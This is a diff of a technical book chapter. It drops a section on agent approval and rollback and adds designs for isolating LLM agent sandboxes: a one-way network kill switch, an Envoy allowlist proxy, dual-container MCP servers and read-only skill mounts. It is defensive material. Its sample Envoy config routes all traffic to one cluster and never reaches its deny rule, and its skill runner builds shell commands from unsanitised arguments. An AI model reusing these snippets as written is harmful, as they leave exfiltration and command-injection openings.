-In the LLM era, the “agent” framing made these older ideas operational again: LLMs began to interleave reasoning with actions (tool calls, API invocations, code execution), increasing both capability and risk. ReAct popularized the now-common loop of *think → act → observe → revise*, which naturally raises the question of when actions should be allowed to mutate the world without a checkpoint. ([arXiv][3]) At the same time, human feedback became a standard technique for aligning model behavior with user intent, reinforcing a broader pattern: autonomy works best when paired with *auditable steps* and *human arbitration* at the right moments. ([arXiv][4]) More recently, systems work has begun to formalize “undo,” “damage confinement,” and *post-facto validation* as first-class abstractions for LLM actions—explicitly connecting modern agents back to transaction and recovery concepts. ([arXiv][52])
-
-### The pattern in detail
-
-The core idea is to treat agent execution as a **controlled transaction over an external world**. The agent can reason freely, but actions that might change state are wrapped in a small number of well-defined mechanisms:
-
-1. **Autonomy levels (policy-driven):** not “autonomous vs supervised” as a binary, but a spectrum of allowed actions.
-2. **Approval gates (pre-commit controls):** pause execution before a risky or irreversible step, obtain an explicit decision, then continue.
-3. **Rollback / compensation (post-commit controls):** if something goes wrong—or if a human later rejects the outcome—undo what can be undone, and compensate what cannot.
-4. **Durability and auditability:** record enough to resume, explain, and repair.
-
-A practical way to implement this is to classify steps into **non-mutating** vs **mutating** actions (and optionally *irreversible mutating* as a special case). Recent work highlights that failures often hinge on a small number of mutating steps, motivating selective gating rather than gating everything. ([OpenReview][6])
-
-#### 1) Model the agent as an execution loop with explicit “pause and resume”
-
-Instead of running the agent until it prints an answer, run it until it either:
-
-* completes, or
-* reaches an action that requires external input (approval, UI-side execution, long-running job result).
-
-Conceptually:
+The `PrivateData` compliance module drives this switch. When a connector retrieves sensitive records -- patient data from a database, financial reports from an internal API -- it calls `PrivateData.add_private_dataset()` to register the dataset and its sensitivity level. The sandbox manager checks this state on every session access. If the session has private data and the container still has full network access, the manager stops the container and creates a new one with `network_mode="none"`, mounting the same workspace directory so files survive the transition.
 
 ```python
-@dataclass
-class ToolCall:
-    name: str
-    args: dict
-    call_id: str
-    is_mutating: bool
-    requires_approval: bool
+class NetworkMode(str, Enum):
+    FULL = "bridge"
+    NONE = "none"
 
-@dataclass
-class PauseForApproval:
-    pending: list[ToolCall]
-    # include enough context to show a human what will happen
-    summary: str
-
-def agent_step(messages, tools, policy) -> str | PauseForApproval:
-    call = plan_next_tool_call(messages, tools)  # LLM decision
-    meta = tool_metadata(call.name)
-
-    if meta.is_mutating and policy.requires_approval(call):
-        return PauseForApproval(
-            pending=[ToolCall(call.name, call.args, call.id, True, True)],
-            summary=render_human_summary(call),
-        )
-
-    result = execute_tool(call)
-    messages = messages + [call_to_message(call), tool_result_message(result)]
-    return continue_or_finish(messages)
+def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
+    if session_has_private_data(user_id, session_id):
+        return NetworkMode.NONE
+    return NetworkMode.FULL
 ```
 
-This “pause object” is the key architectural move: it turns human-in-the-loop from an ad-hoc UI prompt into a **first-class execution outcome** that can be persisted, audited, and resumed. Many modern agent frameworks implement a variant of this via “deferred tool calls” that end a run with a structured list of pending approvals/results, then continue later when those arrive. ([Pydantic AI][54])
+This transition is a one-way ratchet. Once private data enters the session, network access never returns. The sensitivity level can escalate (from INTERNAL to CONFIDENTIAL to SECRET) but never decrease, and the network stays off for the remainder of the session's lifetime. This mirrors the real-world principle that you cannot "un-see" data -- once an agent has processed confidential records, any subsequent code it generates could embed fragments of that data in network requests.
 
-#### 2) Approval gates should be selective, contextual, and explainable
+The binary switch works well for sessions where the data sensitivity is clear-cut. A session analyzing anonymized public datasets runs with full network access. A session processing patient records runs with no network at all. The decision is simple, auditable, and impossible to circumvent from inside the container.
 
-A good approval gate is not “approve every tool call.” Instead, make approvals depend on:
+### The problem with binary
 
-* **mutation risk:** does it change state (send, delete, purchase, write, deploy)?
-* **blast radius:** how big is the possible damage (one file vs an account)?
-* **reversibility:** can the action be undone cheaply and reliably?
-* **sensitivity:** does it touch secrets, money, user identity, regulated data?
+The limitation of the binary switch becomes apparent in mixed workflows. An enterprise agent often needs to combine private data with external services that are themselves trusted: an internal company API, a data warehouse behind the VPN, a cloud service with a Zero Data Retention (ZDR) agreement that guarantees no data is stored or logged on the provider's side. Cutting all network access forces the agent to stop mid-task whenever it needs to reach one of these services after private data has entered the session.
 
-A simple policy sketch:
+Consider a concrete scenario. The agent queries an internal database to retrieve employee compensation data (confidential). It then needs to call an internal payroll API to validate some of the figures. Both systems are internal, both are trusted, and no data leaves the company perimeter. With the binary kill switch, the agent cannot make the API call because all network access was revoked when the compensation data entered the session.
+
+The tension is between safety and utility. Blocking everything is safe but overly restrictive. Allowing everything is useful but dangerous. What we need is selective connectivity: allow the container to reach trusted endpoints while blocking everything else.
+
+### Envoy proxy for selective connectivity
+
+The solution is to place an Envoy proxy between the container and the network, and route all outbound traffic through it. The proxy holds a whitelist of allowed destinations. Requests to whitelisted URLs pass through; everything else is rejected. The container itself has network access, but only through the proxy, and the proxy enforces which destinations are reachable.
+
+The architecture uses two Docker networks. The first is an internal network with no external route, connecting only the sandbox container and the Envoy proxy container. The second is the default bridge network that gives the proxy container access to the outside world. The sandbox container cannot reach the internet directly because its only network has no gateway. It can only reach the proxy, and the proxy decides what traffic to forward.
+
+```
+                  internal network              bridge network
+                  (no gateway)                  (internet access)
+
+ +-------------+                 +-------+                    +-----------+
+ |  Sandbox    | --- HTTP(S) --> | Envoy | --- HTTP(S) -->    | Trusted   |
+ |  Container  |                 | Proxy |                    | Services  |
+ +-------------+                 +-------+                    +-----------+
+                                     |
+                                     X--- blocked -->  Untrusted destinations
+```
+
+The Envoy configuration defines the allowed destinations as clusters and routes. A route matching an allowed domain forwards the request to its cluster. A default route returns 403 Forbidden. The configuration can be as simple as a list of allowed hostnames, or as granular as path-level rules.
+
+```yaml
+# Simplified Envoy route configuration
+virtual_hosts:
+  - name: allowed
+    domains: ["*"]
+    routes:
+      - match: { prefix: "/" }
+        route: { cluster: payroll_api }
+        request_headers_to_add:
+          - header: { key: "x-envoy-upstream-rq-timeout-ms", value: "5000" }
+      - match: { prefix: "/" }
+        direct_response:
+          status: 403
+          body: { inline_string: "Destination not in allowlist" }
+
+clusters:
+  - name: payroll_api
+    type: STRICT_DNS
+    load_assignment:
+      endpoints:
+        - lb_endpoints:
+            - endpoint:
+                address:
+                  socket_address: { address: "payroll.internal.corp", port_value: 443 }
+```
+
+The whitelist is not per-session. It is a platform-level configuration that defines which external services the organization trusts enough to receive data from agent sessions. Typical entries include internal APIs, data warehouses, cloud services with ZDR contracts, and monitoring endpoints. The list is maintained by the platform team, not by the agent or the user, and changes to it follow the same review process as any infrastructure configuration.
+
+### Three network modes
+
+With the proxy in place, the `NetworkMode` enum gains a third option:
 
 ```python
-def requires_approval(call: ToolCall, ctx) -> bool:
-    if not call.is_mutating:
-        return False
-
-    if call.name in {"send_email", "submit_payment", "delete_record"}:
-        return True
-
-    # contextual gating: protected resources, large diffs, prod env, etc.
-    if call.name == "write_file" and ctx.path in ctx.protected_paths:
-        return True
-
-    if estimate_blast_radius(call, ctx) > ctx.max_autonomous_blast_radius:
-        return True
-
-    return False
+class NetworkMode(str, Enum):
+    FULL = "bridge"
+    PROXIED = "proxied"
+    NONE = "none"
 ```
 
-The human needs a crisp, non-LLM-shaped explanation: *what will be changed, where, and how to undo it.* Architecturally, store metadata alongside the paused call (reason codes, diffs, impacted resources) so the UI can render a reliable “approval card” rather than raw model text. Deferred-tool designs explicitly support attaching metadata to approval requests for exactly this purpose. ([Pydantic AI][54])
-
-#### 3) Treat rollback as a design constraint, not an afterthought
-
-Rollback is easy only in toy settings. In real systems:
-
-* some actions are **naturally reversible** (edit draft → revert, create resource → delete it),
-* others are **logically compensatable** (refund payment, send correction email),
-* others are **irreversible** (data leaked, notification pushed to many recipients).
-
-This leads to three complementary techniques:
-
-**A. Undo logs / versioned state** (classic transaction recovery)
-Record “before” state and/or a sequence of state transitions so you can restore consistency after partial failure. ([ACM Digital Library][49])
-
-**B. Compensating actions (Sagas)**
-For distributed or multi-step workflows, define a compensation for each step and run compensations in reverse order on failure. ([Microsoft Learn][55])
-
-**C. Damage confinement (blast-radius limits)**
-If you cannot guarantee undo, restrict what the agent is allowed to touch. Recent LLM-agent runtime work explicitly frames “undo” plus “damage confinement” as the practical path to post-facto validation. ([arXiv][52])
-
-A minimal “saga-like” execution record:
+The mode selection now considers both the presence of private data and the sensitivity level. PUBLIC and INTERNAL data require no restriction -- the session runs with full network access. CONFIDENTIAL data triggers the proxied mode, routing traffic through Envoy so the agent can still reach trusted services but nothing else. SECRET data triggers the full kill switch with no network access whatsoever.
 
 ```python
-@dataclass
-class StepRecord:
-    call: ToolCall
-    result: dict | None
-    compensation: ToolCall | None  # how to undo/compensate
-
-def run_workflow(plan: list[ToolCall]) -> list[StepRecord]:
-    log: list[StepRecord] = []
-    for call in plan:
-        res = execute_tool(call)
-        log.append(StepRecord(call=call, result=res, compensation=derive_compensation(call, res)))
-    return log
-
-def rollback(log: list[StepRecord]) -> None:
-    for step in reversed(log):
-        if step.compensation:
-            execute_tool(step.compensation)
+def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
+    pd = PrivateData(user_id, session_id)
+    if not pd.has_private_data:
+        return NetworkMode.FULL
+    match pd.sensitivity:
+        case DataSensitivity.PUBLIC | DataSensitivity.INTERNAL:
+            return NetworkMode.FULL
+        case DataSensitivity.CONFIDENTIAL:
+            return NetworkMode.PROXIED
+        case DataSensitivity.SECRET:
+            return NetworkMode.NONE
 ```
 
-Key best practice: require tool authors (or tool wrappers) to provide a compensation strategy *at the same time* they provide the mutating tool.
+The ratchet behavior still applies. Sensitivity can escalate from CONFIDENTIAL to SECRET mid-session, causing the container to be recreated with a more restrictive network mode. It cannot go the other direction. A session that was proxied can become fully isolated, but a fully isolated session never regains connectivity.
 
-#### 4) Idempotency and retries are part of “reversibility”
+### Dynamic switching
 
-Approval and rollback don’t matter if your execution layer is unreliable. Two properties reduce accidental double-effects:
+The dynamic switch is the same mechanism described in the sandbox section, extended to handle three modes instead of two. The sandbox manager checks `get_network_mode()` on every `get_or_create_session()` call and compares the result against the container's current network mode. If the required mode is more restrictive than the current mode, the manager stops the container and creates a new one with the correct network configuration, reattaching the workspace volume.
 
-* **Idempotency keys:** if the agent retries, the external system should recognize “same request” and not re-apply it.
-* **Replayable logs:** if the agent process dies mid-run, you can resume from the last known-good step.
+```python
+_MODE_SEVERITY = {NetworkMode.FULL: 0, NetworkMode.PROXIED: 1, NetworkMode.NONE: 2}
 
-This is why “durable execution” and “pause/resume” designs show up together in modern agent tool stacks: approvals and long-running jobs naturally imply persistence and resumption. ([Pydantic AI][56])
+def _ensure_network_mode(self, session: Session) -> None:
+    required = get_network_mode(session.user_id, session.session_id)
+    if _MODE_SEVERITY[required] <= _MODE_SEVERITY[session.network_mode]:
+        return
+    self._recreate_container(session, network_mode=required)
+```
 
-#### 5) Putting it together: supervised autonomy as a small state machine
+The container recreation is transparent to the agent. The workspace directory is a bind mount that survives container lifecycle changes. The agent may notice a brief pause while the new container starts, but all files, intermediate results, and generated code remain in place. From the agent's perspective, the only observable change is that some network destinations that were previously reachable now return errors.
 
-The clean mental model is an agent runtime with a handful of states:
+The transition from FULL to PROXIED requires creating the Envoy sidecar if it does not already exist. The sandbox manager launches the proxy container on the internal network, applies the whitelist configuration, and then attaches the new sandbox container to the same internal network. The proxy container can be shared across multiple sandbox sessions if they all operate at the CONFIDENTIAL level, since it is stateless and the whitelist is platform-wide.
 
-* **Plan / Think** (free-form, no side effects)
-* **Dry-run / Preview** (compute diffs, show what would change)
-* **Approve** (human or policy decision)
-* **Commit** (execute mutating actions)
-* **Verify** (check postconditions; detect partial failure)
-* **Repair** (retry, compensate, or escalate)
+### What the agent sees
 
-This also clarifies a subtle but important point: *human-in-the-loop is not only “before commit”*. Post-facto validation becomes credible only if you have real undo/containment mechanisms behind it, as argued in GoEx-style runtime proposals. 
+From the agent's perspective, the kill switch manifests as network errors. Code that tries to reach a blocked destination gets a connection refused (NONE mode) or a 403 response (PROXIED mode). The agent has no mechanism to disable the switch, reconfigure the proxy, or escalate its own network privileges. These controls live outside the container, in infrastructure the agent cannot modify.
 
-### References
+For a better user experience, the system can inject a message into the agent's context when the network mode changes, explaining what happened and why. This lets the agent adapt its strategy rather than repeatedly failing on blocked requests.
 
-1. Eric Horvitz. *Principles of Mixed-Initiative User Interfaces*. CHI, 1999. ([erichorvitz.com][48])
-2. Theo Haerder and Andreas Reuter. *Principles of Transaction-Oriented Database Recovery*. ACM Computing Surveys, 1983. ([ACM Digital Library][49])
-3. Jim Gray and Andreas Reuter. *Transaction Processing: Concepts and Techniques*. Morgan Kaufmann, 1992. ([Elsevier Shop][57])
-4. Shunyu Yao et al. *ReAct: Synergizing Reasoning and Acting in Language Models*. arXiv, 2022. ([arXiv][50])
-5. Long Ouyang et al. *Training Language Models to Follow Instructions with Human Feedback*. NeurIPS, 2022. ([NeurIPS Proceedings][58])
-6. Reiichiro Nakano et al. *WebGPT: Browser-assisted Question-answering with Human Feedback*. arXiv, 2021. ([arXiv][59])
-7. Shishir G. Patil et al. *GoEx: Perspectives and Designs Towards a Runtime for Autonomous LLM Applications*. arXiv, 2024. ([arXiv][52])
-8. Microsoft Azure Architecture Center. *Saga Design Pattern*. (Documentation). ([Microsoft Learn][55])
-9. Pydantic AI Documentation. *Deferred Tools: Human-in-the-Loop Tool Approval*. (Documentation). ([Pydantic AI][54])
+```
+[SYSTEM] Network access has been restricted because confidential data
+entered this session. Outbound connections are limited to approved
+internal services. External API calls will be blocked.
+```
 
-[48]: https://erichorvitz.com/chi99horvitz.pdf?utm_source=chatgpt.com "Principles of Mixed-Initiative User Interfaces - of Eric Horvitz"
-[49]: https://dl.acm.org/doi/10.1145/289.291?utm_source=chatgpt.com "Principles of transaction-oriented database recovery"
-[50]: https://arxiv.org/abs/2210.03629?utm_source=chatgpt.com "ReAct: Synergizing Reasoning and Acting in Language Models"
-[51]: https://arxiv.org/abs/2203.02155?utm_source=chatgpt.com "Training language models to follow instructions with human feedback"
-[52]: https://arxiv.org/abs/2404.06921?utm_source=chatgpt.com "[2404.06921] GoEX: Perspectives and Designs Towards a ..."
-[53]: https://openreview.net/forum?id=JuwuBUnoJk&utm_source=chatgpt.com "Small Actions, Big Errors — Safeguarding Mutating Steps ..."
-[54]: https://ai.pydantic.dev/deferred-tools/ "Deferred Tools - Pydantic AI"
-[55]: https://learn.microsoft.com/en-us/azure/architecture/patterns/saga?utm_source=chatgpt.com "Saga Design Pattern - Azure Architecture Center"
-[56]: https://ai.pydantic.dev/?utm_source=chatgpt.com "Pydantic AI - Pydantic AI"
-[57]: https://shop.elsevier.com/books/transaction-processing/gray/978-0-08-051955-5?utm_source=chatgpt.com "Transaction Processing - 1st Edition"
-[58]: https://proceedings.neurips.cc/paper_files/paper/2022/file/b1efde53be364a73914f58805a001731-Paper-Conference.pdf?utm_source=chatgpt.com "Training language models to follow instructions with ..."
-[59]: https://arxiv.org/abs/2112.09332?utm_source=chatgpt.com "WebGPT: Browser-assisted question-answering with human feedback"
+The agent can then decide to work with the data locally, use an approved service, or ask the user for guidance -- rather than wasting turns on requests that will never succeed.
+
+### Relationship to tool permissions
+
+The kill switch and the tool permission system are independent enforcement layers that protect against different vectors. Tool permissions prevent the agent from calling tools it should not use -- for example, blocking a `CONNECT`-tagged tool when private data is present. The kill switch prevents code inside the sandbox from making network connections that bypass the tool system entirely.
+
+Neither layer depends on the other. An agent session with private data has both protections active simultaneously: tool permissions block the tool-calling path, and the kill switch blocks the code-execution path. This defense-in-depth means that a failure or misconfiguration in one layer does not expose the data through the other.
+
+```
+Agent
+  |
+  |-- Tool call path
+  |     @tool_permission(CONNECT) blocks exfiltration tools
+  |
+  |-- Code execution path (sandbox)
+        Kill switch blocks network at infrastructure level
+        (NONE: all traffic blocked, PROXIED: only whitelist allowed)
+```
+
+Together with the `PrivateData` compliance module that drives both layers, the system provides a coherent data protection pipeline: connectors tag data as it enters the session, tool permissions restrict the agent's tool vocabulary, and the kill switch restricts the sandbox's network reach. Each layer operates at a different level of the stack, and all three activate automatically from the same trigger.
 
 
-## Approval, Rollback, and Reversibility
+## MCP Server Isolation
 
+MCP servers deserve the same network isolation treatment as code-execution sandboxes. When your agent connects to an MCP server -- particularly one you did not write -- every tool call is an opportunity for arbitrary code to run on the server side. A tool that fetches data from an external API, sends an email, or posts to a webhook can exfiltrate private data just as easily as a line of Python in a REPL sandbox. Running MCP servers inside Docker containers and applying the kill switch pattern from the previous section closes this gap.
+
+### Two containers, one server
+
+The approach is straightforward: run two instances of the same MCP server image, each with a different network mode. The first instance runs on the bridge network with full connectivity. The second runs on an isolated network with no external access (or proxied access through Envoy, depending on the sensitivity level). Both containers mount the same workspace volume so they share state. The agent's MCP client switches which instance it connects to based on the session's `PrivateData` status.
+
+```
+ +--------+       no private data        +-------------------+
+ |        | ---------------------------> | MCP Server        |
+ | Agent  |                              | (bridge network)  |
+ |        |       private data present   +-------------------+
+ |        | ---------------------------> +-------------------+
+ +--------+                              | MCP Server        |
+                                         | (no network)      |
+                                         +-------------------+
+```
+
+The MCP server code does not change between instances. The only difference is the Docker network configuration. Tools that require external connectivity will fail with connection errors in the isolated instance, which is the desired behavior -- the agent should not be able to reach external services through MCP tools once private data enters the session.
+
+### Configuration
+
+The `config.yaml` already holds MCP client entries with a `url` field pointing at the server. To support the dual-container pattern, each MCP server entry gets a `url_isolated` field for the restricted instance:
+
+```yaml
+mcp_servers:
+  data_tools:
+    type: client
+    url: "http://data-tools:8000/mcp"
+    url_isolated: "http://data-tools-isolated:8000/mcp"
+    read_timeout: 60
+```
+
+The `MCPClientConfig` model adds the optional field:
+
+```python
+class MCPClientConfig(BaseModel):
+    type: str = Field(default="client")
+    url: str
+    url_isolated: str | None = None
+    read_timeout: int = Field(default=60)
+```
+
+When `url_isolated` is not set, the client always uses `url` regardless of private data status -- the server either does not need isolation or handles it internally.
+
+### Client-side switching
+
+The `get_mcp_client()` function resolves the correct URL at connection time by checking the session's private data status:
+
+```python
+def get_mcp_client(
+    name: str,
+    config_path: Path | str | None = None,
+    bearer_token: str | None = None,
+) -> MCPServerStreamableHTTP:
+    settings = _load_mcp_settings(config_path)
+    config = settings.get(name)
+
+    url = config.url
+    if config.url_isolated and session_has_private_data(*get_user_session()):
+        url = config.url_isolated
+
+    headers = {"Authorization": f"Bearer {bearer_token}"} if bearer_token else None
+    return MCPServerStreamableHTTP(url=url, timeout=config.read_timeout, headers=headers)
+```
+
+Because PydanticAI creates a new MCP connection context for each agent run, the switch happens naturally between turns. When private data enters the session mid-conversation, the next agent run picks up the isolated URL automatically. No container recreation or connection teardown is needed on the client side -- it simply points at a different endpoint.
+
+### Deploying the containers
+
+A typical `docker-compose.yaml` runs both instances from the same image:
+
+```yaml
+services:
+  data-tools:
+    image: my-mcp-server:latest
+    networks: [bridge]
+    volumes: [workspace:/workspace]
+
+  data-tools-isolated:
+    image: my-mcp-server:latest
+    network_mode: "none"
+    volumes: [workspace:/workspace]
+```
+
+For CONFIDENTIAL data where proxied access is acceptable, the isolated instance can use the same Envoy sidecar pattern described in the kill switch section, attaching it to an internal Docker network with the proxy as the only gateway.
+
+### When to use this pattern
+
+This pattern is essential for third-party or untrusted MCP servers where you cannot audit or control the tool implementations. But it is also highly recommended for your own servers: even well-tested code can have bugs, missed edge cases, or regressions that accidentally leak private data over the network. The container-level network block acts as a safety net that enforces the invariant regardless of application-level correctness. Think of it as defense-in-depth -- `@tool_permission(CONNECT)` and compliance checks are the first line, but the network kill switch ensures that a code mistake cannot silently bypass them.
+
+
+## Sandboxing Skill Execution
+
+The sandbox infrastructure described earlier runs agent-generated code in isolated containers. Skills introduce a different trust model: the code is authored by developers, not by the agent. The agent chooses which skill to invoke and with what arguments, but the implementation itself is fixed. This distinction calls for a read-only execution layer where the container can run skill scripts but cannot modify them.
+
+### Read-Only Mounts
+
+The `ContainerConfig` accepts a `read_only_mounts` dictionary that maps host paths to container paths. When the container is created, these are mounted alongside the writable `/workspace` volume, but with Docker's `ro` flag:
+
+```python
+volumes = {str(session.data_dir): {"bind": config.working_dir, "mode": "rw"}}
+for host_path, container_path in config.read_only_mounts.items():
+    volumes[host_path] = {"bind": container_path, "mode": "ro"}
+```
+
+The result is two distinct zones inside the container. `/workspace` is the agent's writable scratch space for data and generated code. `/skills` is an immutable library of developer-authored scripts. The agent can read and execute anything under `/skills`, but any attempt to write there fails at the filesystem level.
+
+### Wiring Skills to the Sandbox
+
+The `SandboxManager` receives read-only mounts at construction time. A skill registry maps each skill name to a host directory containing a `scripts/` subdirectory. These are passed as read-only mounts so that every container in every session sees the same skill scripts at the same container paths.
+
+The `run_skill_script` tool function bridges the two systems. It looks up the skill in the registry, resolves the script name to a container path under `/skills/{skill_name}/scripts/{script_name}`, and dispatches execution via `SandboxManager.execute_command`. Python scripts are invoked with `python`, shell scripts with `bash`. The tool returns the exit code and combined output.
+
+```python
+container_path = f"/skills/{skill.path.name}/scripts/{script_name}"
+command = f"python {container_path} {args}" if script_name.endswith(".py") else f"bash {container_path} {args}"
+return manager.execute_command(user_id, session_id, command)
+```
+
+Because `execute_command` calls `get_or_create_session` internally, skill execution benefits from the same lifecycle management, network isolation, and workspace persistence described in previous sections. If the session already has a container, the command runs there. If not, a new container is created with both the writable workspace and the read-only skill mounts. If PrivateData triggers a network ratchet mid-conversation, the recreated container preserves both mount types.
+
+### Why Read-Only Matters
+
+Without the read-only flag, a compromised or misbehaving agent could rewrite a skill script to inject malicious logic that executes on the next invocation -- either in the same session or, if mounts are shared, in other sessions. The `ro` flag is a filesystem-level guarantee enforced by Docker, not by application code. It does not depend on the agent cooperating or on any permission checks in the Python layer.
+
+This creates a clean trust boundary: developers author skills, the platform mounts them immutably, and the agent can only invoke them as-is. The writable workspace remains available for the agent's own data and generated code, keeping the two trust levels physically separated inside the same container.
 
 
 \newpage
